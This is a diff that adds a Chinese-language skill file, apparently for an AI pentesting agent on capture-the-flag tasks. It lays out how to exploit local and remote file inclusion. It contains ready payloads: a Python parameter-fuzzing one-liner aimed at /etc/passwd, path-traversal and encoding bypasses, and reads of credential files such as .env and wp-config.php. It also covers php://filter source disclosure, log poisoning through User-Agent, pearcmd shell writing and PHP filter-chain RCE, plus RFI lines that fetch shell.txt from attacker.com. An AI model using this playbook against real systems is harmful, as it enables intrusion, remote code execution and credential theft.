@@ -1,0 +1,108 @@
+---
+name: lfi-rfi-methodology
+description: "本地文件包含(LFI)/远程文件包含(RFI)/任意文件读取的检测和利用。当目标有文件包含参数(page/file/include/lang)、PHP应用、日志文件可写时使用。包含file_exists()陷阱、PHP include()语法错误诊断、日志投毒正确payload、pearcmd.php利用、PHP filter chain RCE、session文件包含条件竞争"
+metadata:
+  tags: "lfi,rfi,file inclusion,file-inclusion,local file inclusion,path-traversal,rce,log-poisoning,目录穿越,文件包含,php://filter,data://,expect://,proc/self,etc/passwd,pearcmd,auto_prepend,文件读取,任意文件读取"
+  category: "exploit"
+---
+
+# 文件包含漏洞方法论 (LFI/RFI)
+
+
+## ⛔ 深入参考（确认 LFI 后必读）
+
+- 日志投毒完整步骤、PHP Wrapper、Session 文件包含、include() 陷阱诊断 → [references/lfi-to-rce.md](references/lfi-to-rce.md)
+- pearcmd.php 利用、PHP Filter Chain RCE、Session 条件竞争 → 同在 [references/lfi-to-rce.md](references/lfi-to-rce.md)
+- LFI 到 RCE 提权路径详解 → [references/lfi2rce-techniques.md](references/lfi2rce-techniques.md)
+
+---
+
+## ⛔ Phase 0: 页面发现（LFI 测试的前提！）
+
+**在测试 LFI 之前必须先找全所有可访问页面。**
+
+1. 用 `ffuf` / `spray` 扫描 `.php/.html`；失败时立即降级用 python3 requests 批量测试：
+```
+private.php, admin.php, secret.php, flag.php, test.php, debug.php, panel.php, dashboard.php,
+upload.php, api.php, config.php, backup.php, shell.php, cmd.php, exec.php, portal.php,
+manage.php, internal.php, hidden.php, restricted.php, secure.php, system.php, info.php,
+phpinfo.php, setup.php, install.php, download.php, view.php, file.php, read.php, include.php
+```
+2. 记录所有返回 200 且非空的页面 → 这些才是 LFI 测试目标
+
+## Phase 1: 发现文件包含点
+
+⛔ **退出条件**：某端点测试 3+ 个参数均无响应差异（长度差 < 10 字节）→ 标记"无 LFI" → 换端点
+
+### ⛔ 参数 Fuzz（一步到位，禁止逐个手动测试！）
+
+用 Python 批量测试所有常见参数（3 轮以上还在枚举参数 = 违规）：
+```
+python3 -c "import requests;[print(f'FOUND: {p}?{param}') for p in ['private.php','index.php','page.php','view.php','file.php','read.php'] for param in ['file','page','path','include','doc','template','lang','module','view','load'] if 'root:' in requests.get(f'http://TARGET/{p}?{param}=../../../etc/passwd',timeout=3).text]"
+```
+- ffuf 做参数 Fuzz 时：wordlist 必须用 `Web/CTF/Fuzz_param.txt`（不是目录字典！）
+- 不能只测 file 参数：id 参数也可能存在 LFI
+- URL 编码绕过：`..%2f`、`%2e%2e%2f` 绕过路径过滤
+
+常见参数名: `file`, `page`, `path`, `include`, `doc`, `template`, `lang`, `module`, `action`, `view`
+
+测试向量:
+```
+?file=../../../etc/passwd
+?file=../../../etc/passwd%00       (PHP < 5.3.4)
+?file=..%252f..%252fetc%252fpasswd (双编码)
+```
+
+**验证方法**: 对比有参数和无参数的响应长度/内容，有差异 = 参数有效
+
+## Phase 2: 路径穿越测试
+```
+逐步增加 ../ 层数（通常4-7层到根目录）:
+?file=../../../../etc/passwd
+```
+
+## Phase 3: 关键文件读取
+
+### ⛔ Dockerfile/源码优先路径规则
+当已获取 Dockerfile 或应用源码时：
+1. 提取 `WORKDIR` 值（如 `/var/www/html/`）
+2. 提取 flag 文件名（如 `xbow-flag.txt`）
+3. **拼接 WORKDIR + filename 作为第一优先读取路径**（如 `/var/www/html/xbow-flag.txt`）
+4. ⛔ 禁止跳过已知路径去盲猜 `/app/flag.txt` `/flag` 等
+
+**Linux**: `/etc/passwd`, `/proc/self/environ`, `/var/log/apache2/access.log`
+**Windows**: `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`
+**Web应用**: `config.php`, `.env`, `wp-config.php`
+**源码**: `php://filter/convert.base64-encode/resource=index`
+
+### PHP 文件包含陷阱
+- 直接 include .php 文件不会显示源码，只执行代码
+- 需要用 `php://filter/convert.base64-encode/resource=xxx` 读取 PHP 源码
+
+## Phase 4: LFI → RCE 决策树
+
+⛔ **日志投毒优先触发条件**：当任务描述/题目名包含 `poison`、`log`、`日志` 关键字时，**跳过 wrapper 尝试，直接进入日志投毒流程**！
+
+```
+LFI 确认
+│   ├─ ⛔ 题目含 "poison"/"log" 关键字？→ 直接日志投毒（跳过 Phase 3 后半段）
+│   ├─ 目标是 PHP + include()？
+│   │   ├─ pearcmd.php 存在？→ pearcmd 写 shell（最快，不依赖日志/session）
+│   │   ├─ file_exists() 不检查？→ php://input / data:// wrapper
+│   │   ├─ file_exists() 检查？→ wrapper 不可用！用日志投毒或 PHP filter chain
+│   │   ├─ 有 session 功能？→ Session 文件包含（将 PHP 代码注入 session 如用户名字段，包含 session 文件执行）
+│   ├─ 日志投毒（最通用）
+│   │   ├─ User-Agent 注入 PHP 代码
+│   │   ├─ ⚠️ 绝对不用 system('cat /file.php')！用 file_get_contents() + echo
+│   │   └─ 包含 /var/log/apache2/access.log 触发
+│   ├─ PHP Filter Chain RCE（无需文件写入/日志/session）
+│   │   └─ 用 php_filter_chain_generator.py 生成 chain
+│   └─ 详细步骤 → [references/lfi-to-rce.md](references/lfi-to-rce.md)
+```
+
+## Phase 5: RFI 测试
+`?file=http://attacker.com/shell.txt` (需 allow_url_include=On) | `?file=\\attacker.com\share\shell.php` (SMB/UNC)
+
+## 注意事项
+- **include() 会执行 PHP，file_get_contents() 读原始文本** — 关键区别
+- LFI 比 RFI 更常见（RFI 需 PHP 配置允许）| HTTP 200 + Content-Length: 0 → PHP 语法错误被吞
